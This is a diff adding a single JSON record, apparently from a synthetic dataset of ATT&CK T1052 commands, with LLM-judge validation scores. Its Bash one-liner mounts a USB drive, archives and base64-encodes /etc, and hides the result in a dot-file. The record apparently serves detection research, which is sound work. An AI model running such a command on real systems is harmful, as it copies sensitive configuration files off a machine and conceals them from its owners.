@@ -1,0 +1,60 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo bash -c 'UPART=$(ls -1 /dev/disk/by-id/usb-*-part1 2>/dev/null | head -n1); mkdir -p /mnt/usb && mount \"$UPART\" /mnt/usb && tar -cf - /etc | gzip -9 | base64 > /mnt/usb/.conf.img && sync && umount /mnt/usb'",
+  "explanation": "Mounts a USB partition by-id, compresses /etc with gzip, base64-encodes the content to reduce casual inspection, and stores it on the USB locally.",
+  "rationale_steps": [
+    "Resolve the USB partition via stable by-id path.",
+    "Mount the physical media locally.",
+    "Create and gzip a tar of configuration files.",
+    "Base64-encode the compressed stream and write to a hidden-like filename.",
+    "Sync and unmount the drive; no network used."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-a8d8a262-a009ca86",
+  "source_prompt_hash": "a8d8a262",
+  "timestamp_utc": "2025-09-30T05:22:34.253309Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command has balanced quoting, correct use of separators (;, &&, |), valid flags, and a coherent pipeline with proper redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "It identifies a USB partition by-id, mounts it, archives and compresses /etc, base64-encodes the result to a hidden file on the USB, syncs, and unmounts, aligning with exfiltration over a physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T09:06:01.994787Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and appropriate error handling with redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the T1052 technique by identifying a USB device, mounting it, compressing and encoding sensitive system configuration files (/etc), hiding them with a dot-prefixed filename, and properly unmounting the device.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T09:06:04.837671Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax, balanced quotes, valid command separators, and proper flag usage.",
+        "semantic_score": 5,
+        "semantic_justification": "The command flawlessly achieves its claimed intent by robustly identifying and mounting a USB, effectively staging, compressing, base64-encoding, and saving sensitive data to it, perfectly aligning with the T1052 technique for exfiltration over a physical medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T09:06:17.648932Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
